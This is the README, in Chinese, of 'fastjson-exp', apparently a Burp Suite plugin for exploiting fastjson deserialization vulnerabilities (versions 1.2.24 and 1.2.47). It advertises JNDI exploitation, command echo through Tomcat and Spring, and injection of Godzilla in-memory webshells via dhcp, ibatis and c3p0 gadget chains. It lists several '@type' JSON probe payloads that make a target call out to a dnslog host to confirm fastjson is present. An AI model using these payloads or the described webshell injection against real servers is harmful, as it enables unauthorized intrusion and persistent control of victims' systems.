# fastjson-exp
fastjson利用，burp插件。
支持jndi利用检测，tomcat、spring回显，哥斯拉内存马，回显利用链为dhcp、ibatis、c3p0，内存马支持tomcat89
# 用法
加载到burp插件，自行选择echo、jndi、inject。
探测存在后，发送Repeater自行修改请求头，回显在响应头。如下
![image](https://user-images.githubusercontent.com/38367493/158349823-b52b658a-e734-4fe1-9096-e2272c1e8cde.png)

![image](https://user-images.githubusercontent.com/38367493/158350504-07f05d22-2f28-41b8-8903-9f462f7b8292.png)

![image](https://user-images.githubusercontent.com/38367493/158349892-9931206f-2feb-4ea8-b682-bd41296a93dc.png)

# 测试环境
tomcat启动后，将war包放在webapps目录即（tomcat自带dhcp依赖），漏洞环境为1.2.24和1.2.47。

# 判断是否使用fastjon组件
dns
● {"@type":"java.net.Inet4Address","val":"dnslog"}

● {"@type":"java.net.Inet6Address","val":"dnslog"}

● {"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}

● {{"@type":"java.net.URL","val":"http://dnslog"}:0

● {"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}

● Set[{"@type":"java.net.URL","val":"http://dnslog"}]
